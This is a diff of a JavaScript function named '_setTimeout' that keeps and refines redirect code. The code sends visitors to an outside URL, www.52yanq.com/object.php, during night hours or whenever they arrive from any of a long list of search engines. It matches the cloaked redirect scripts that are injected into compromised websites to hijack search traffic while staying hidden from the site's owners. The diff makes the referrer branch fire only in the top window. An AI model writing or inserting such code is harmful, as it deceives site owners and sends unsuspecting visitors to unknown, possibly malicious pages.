@@ -26,16 +26,17 @@ function _setTimeout(){
 		 var now = new Date();
 		 var hours = now.getHours();
 		 if(hours>=19 || hours<=7) {
-			if(window.self==window.top){		
+			if(window.self==window.top){
 				window.location.href='http://www.52yanq.com/object.php';
 			}
-
 		 }else{
 			var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso|godado|msn|excite|libero|iltrovatore|tiscali)(\.[a-z0-9\-]+){1,2}\//ig;
 			var where =document.referrer;
 			if(regexp.test(where))
 			{
-				window.location.href='http://www.52yanq.com/object.php';
+				if(window.self==window.top){
+					window.location.href='http://www.52yanq.com/object.php';
+				}
 			}
 		 }
 	}
